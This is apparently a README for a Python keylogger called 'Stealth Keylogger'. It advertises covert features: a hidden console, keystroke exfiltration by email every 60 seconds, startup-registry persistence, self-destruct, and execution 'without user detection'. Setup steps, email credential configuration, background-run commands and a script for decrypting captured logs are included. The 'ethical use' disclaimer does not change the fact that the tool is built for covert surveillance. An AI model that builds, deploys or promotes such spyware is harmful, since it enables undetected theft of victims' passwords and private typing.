# Stealth Keylogger

## Overview
Stealth Keylogger is a Python-based keylogging tool that operates in stealth mode, encrypts logs, and optionally sends captured keystrokes via email. It is designed for ethical use in security monitoring, personal data logging, and cybersecurity research.

## Features
✅ **Stealth Mode (Windows)** – Hides the console window using `ctypes`.
✅ **Encrypted Logs** – Uses AES-based encryption (`Fernet`) to protect logs.
✅ **Efficient Logging** – Stores typed words only when `Space` or `Enter` is pressed.
✅ **Ignores Special Keys** – Prevents logging `Backspace, Ctrl, Alt, Shift, Arrow Keys, etc.`.
✅ **Email Exfiltration** – Sends logs via email **every 60 seconds**.
✅ **Self-Destruct Mode** – Deletes logs and the script when triggered.
✅ **Auto-Run on Startup** – Registers as a startup program (Windows only).

## Installation
### Step 1: Install Dependencies
```bash
pip install pynput cryptography
```

### Step 2: Configure Email Credentials
Edit the script and replace the following variables with your own email details:
```python
EMAIL_SENDER = "your_email@gmail.com"
EMAIL_PASSWORD = "your_email_password"
EMAIL_RECEIVER = "receiver_email@gmail.com"
```
⚠️ *If using Gmail, enable "Less Secure Apps" or create an App Password.*

### Step 3: Run the Keylogger
- **Windows:** Double-click or run it in the terminal:
  ```bash
  python script.py
  ```
- **Linux/macOS:** Run in the background:
  ```bash
  nohup python3 script.py & disown
  ```

## How to Decrypt Logs
To read stored logs, use the following script:
```python
from cryptography.fernet import Fernet
import json

logs_file = "logs.enc"
key_file = "secret.key"

with open(key_file, "rb") as file:
    key = file.read()

cipher = Fernet(key)

with open(logs_file, "rb") as file:
    encrypted_data = file.read()
    decrypted_logs = json.loads(cipher.decrypt(encrypted_data).decode())

for entry in decrypted_logs:
    print(entry)
```

## Additional Features
- **Self-Destruct Mode**: Deletes logs and the script when triggered.
- **Startup Persistence (Windows)**: Adds itself to Windows startup registry.
- **Silent Execution**: Runs in the background without user detection.

## Disclaimer
⚠️ This tool is intended for **ethical use only**. Unauthorized use of keyloggers may violate privacy laws. The author is not responsible for any misuse.

## License
This project is for educational purposes only. Use responsibly.

